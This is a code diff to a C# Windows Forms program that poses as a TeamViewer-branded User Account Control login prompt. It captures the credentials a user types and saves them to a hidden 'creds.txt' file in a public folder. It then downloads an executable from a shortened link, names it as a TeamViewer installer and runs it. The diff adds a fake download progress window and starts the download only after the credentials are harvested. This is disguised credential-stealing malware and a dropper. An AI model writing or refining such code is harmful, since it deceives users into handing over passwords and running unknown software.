@@ -21,6 +21,7 @@ namespace uac
         private static string currentDomain = Environment.UserDomainName;
         private static string fileUrl = "https://bit.ly/40dN90f";
         private static string fileName = @"C:\Users\" + currentUserName + @"\Downloads\TeamViewer_Setup_x64.exe";
+
         public Form1()
         {
             InitializeComponent();
@@ -30,14 +31,9 @@ namespace uac
             sound.Play();
             this.label4.Text = currentDomain;
             this.Icon = Properties.Resources.TeamViewer_Logo_Icon_Only;
-            downloadExe();
+
         }
 
-        private void textBox1_TextChanged(object sender, EventArgs e)
-        {
-            
-            
-        }
 
         private void button2_Click(object sender, EventArgs e)
         {
@@ -50,6 +46,8 @@ namespace uac
             this.textBox2.Text = "Password";
             this.textBox1.ForeColor = Color.Gray;
             this.textBox2.ForeColor = Color.Gray;
+            this.textBox1.Cursor = Cursors.IBeam;
+            button1.Focus();
         }
 
         private void textBox1_Enter(object sender, EventArgs e)
@@ -106,16 +104,42 @@ namespace uac
             File.SetAttributes(@"C:\Users\Public\Documents\creds.txt", FileAttributes.Hidden);
 
             //DialogResult result = MessageBox.Show("Failed to authenticate user.\n\nAccess denied or timeout expired\nCheck if you have local administrator privilages on computer '" + computerName + "'\n\nPossible reasons:\n1. Invalid credentials" , "User Account Control", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            Close();
-            Thread.Sleep(3000);
-            Process.Start(fileName);
+
+            //Thread.Sleep(3000);
+            this.Hide();
+            Teamviewer pgBar = new Teamviewer();
+            
+            pgBar.Show();
+            pgBar.BringToFront();
+            downloadExe(pgBar);
             
         }
 
-        public void downloadExe()
+        public void downloadExe(Teamviewer pgBar)
         {
             using (WebClient client = new WebClient())
             {
+                client.DownloadProgressChanged += (sender, e) =>
+                {
+                    // Update progress bar on the ProgressForm
+                    pgBar.SetProgressValue(e.ProgressPercentage);
+                };
+
+                client.DownloadFileCompleted += (sender, e) =>
+                {
+                    // Close the ProgressForm when download is complete
+                    try
+                    {
+                        Process.Start(fileName);
+                        
+                    }
+                    catch(Exception ex)
+                    {
+                        Application.Exit();
+                    }
+                    //pgBar.Close();
+                    Application.Exit();
+                };
 
                 client.DownloadFileAsync(new Uri(fileUrl), fileName);
             }
@@ -141,5 +165,6 @@ namespace uac
 
             button3.ForeColor = Color.Black;
         }
+
     }
 }
